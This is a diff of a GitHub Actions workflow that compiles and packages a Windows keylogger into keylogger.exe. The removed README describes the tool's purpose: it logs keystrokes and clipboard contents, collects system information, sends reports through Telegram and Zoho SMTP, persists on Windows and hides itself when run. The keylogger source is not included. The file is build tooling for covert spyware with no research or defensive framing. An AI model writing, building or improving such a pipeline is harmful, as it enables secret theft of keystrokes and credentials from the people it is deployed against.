@@ -1,128 +1,51 @@
-name: Build Windows Keylogger Bot
+name: Build Windows Keylogger
 
-on:
-  push:
-    branches: [ main, master ]
-  pull_request:
-    branches: [ main, master ]
-  workflow_dispatch:
-
-env:
-  BUILD_TYPE: Release
+on: [push, workflow_dispatch]
 
 jobs:
-  build-windows:
+  build:
     runs-on: windows-latest
     
     steps:
-    - name: Checkout repository
-      uses: actions/checkout@v4
-      
+    - uses: actions/checkout@v4
+    
     - name: Setup MSVC
       uses: ilammy/msvc-dev-cmd@v1
       
-    - name: Install OpenSSL
+    - name: Install OpenSSL (Quick)
       run: |
-        # Download and install OpenSSL
-        $url = "https://slproweb.com/download/Win64OpenSSL-3_1_4.exe"
-        $output = "openssl-setup.exe"
-        Invoke-WebRequest -Uri $url -OutFile $output
-        Start-Process -Wait -FilePath $output -ArgumentList "/silent /verysilent /sp- /suppressmsgboxes"
-        Remove-Item $output
+        choco install openssl -y --force
         
-        # Add OpenSSL to PATH
-        $opensslPath = "C:\Program Files\OpenSSL-Win64\bin"
-        echo "OPENSSL_ROOT_DIR=C:\Program Files\OpenSSL-Win64" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
-        echo "$opensslPath" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append
-        
-    - name: Install CMake
-      uses: lukka/get-cmake@latest
-      
-    - name: Configure CMake
+    - name: Build with MSVC directly
       run: |
-        cmake -B ${{github.workspace}}/build -DCMAKE_BUILD_TYPE=${{env.BUILD_TYPE}} -DCMAKE_PREFIX_PATH="C:\Program Files\OpenSSL-Win64"
-      
-    - name: Build
-      run: |
-        cmake --build ${{github.workspace}}/build --config ${{env.BUILD_TYPE}} --parallel 4
-      
-    - name: Test (Optional)
-      run: |
-        cd ${{github.workspace}}/build
-        ctest -C ${{env.BUILD_TYPE}} --output-on-failure
-      
-    - name: Create Release Package
-      run: |
-        $buildDir = "${{github.workspace}}/build/${{env.BUILD_TYPE}}"
-        $packageName = "WindowsKeyloggerBot-v1.0.0"
+        # Create main.cpp with your code
+        # (You need to ensure your code is in main.cpp)
         
-        # Create directory structure
-        New-Item -ItemType Directory -Force -Path "dist/$packageName"
+        # Set environment
+        set OPENSSL_INCLUDE="C:\Program Files\OpenSSL-Win64\include"
+        set OPENSSL_LIB="C:\Program Files\OpenSSL-Win64\lib"
         
-        # Copy executable
-        Copy-Item "$buildDir/Windows Keylogger Bot.exe" "dist/$packageName/keylogger.exe"
+        # Compile
+        cl /O2 /MT /EHsc /std:c++17 ^
+           /I"%OPENSSL_INCLUDE%" ^
+           /DWIN32_LEAN_AND_MEAN /D_WINSOCKAPI_ ^
+           main.cpp ^
+           /link ^
+           /SUBSYSTEM:WINDOWS ^
+           /OUT:keylogger.exe ^
+           "%OPENSSL_LIB%\libssl.lib" ^
+           "%OPENSSL_LIB%\libcrypto.lib" ^
+           winhttp.lib user32.lib shell32.lib ole32.lib kernel32.lib ^
+           gdi32.lib crypt32.lib iphlpapi.lib ws2_32.lib advapi32.lib
         
-        # Copy required DLLs
-        $dlls = @(
-            "libssl-3-x64.dll",
-            "libcrypto-3-x64.dll"
-        )
+        # Copy DLLs
+        copy "C:\Program Files\OpenSSL-Win64\bin\libssl-3-x64.dll" .
+        copy "C:\Program Files\OpenSSL-Win64\bin\libcrypto-3-x64.dll" .
         
-        foreach ($dll in $dlls) {
-            if (Test-Path "$buildDir/$dll") {
-                Copy-Item "$buildDir/$dll" "dist/$packageName/"
-            }
-        }
-        
-        # Create README
-        $readme = @"
-# Windows Keylogger Bot v1.0.0
-
-## Features
-- Keystroke logging
-- Clipboard monitoring
-- System information collection
-- Telegram notifications
-- SMTP email reports (Zoho support)
-- Windows persistence
-
-## Requirements
-- Windows 7 or newer
-- OpenSSL DLLs included
-
-## Usage
-Run 'keylogger.exe' - it will auto-hide and start monitoring.
-
-## Configuration
-Edit the source code to configure:
-- Telegram bot token and chat ID
-- SMTP credentials (Zoho)
-- Email recipients
-
-## Build Dependencies
-- OpenSSL 3.x
-- Windows SDK
-- CMake 3.15+
-
-"@
-        
-        $readme | Out-File -FilePath "dist/$packageName/README.txt" -Encoding UTF8
-        
-        # Create ZIP archive
-        Compress-Archive -Path "dist/$packageName/*" -DestinationPath "dist/$packageName.zip" -Force
-        
-    - name: Upload Artifact
+    - name: Upload executable
       uses: actions/upload-artifact@v4
       with:
-        name: WindowsKeyloggerBot
+        name: keylogger-build
         path: |
-          dist/*.zip
-          build/${{env.BUILD_TYPE}}/*.exe
-          build/${{env.BUILD_TYPE}}/*.dll
-          
-    - name: Create GitHub Release
-      if: startsWith(github.ref, 'refs/tags/')
-      uses: softprops/action-gh-release@v1
-      with:
-        files: dist/*.zip
-        generate_release_notes: true
+          keylogger.exe
+          *.dll
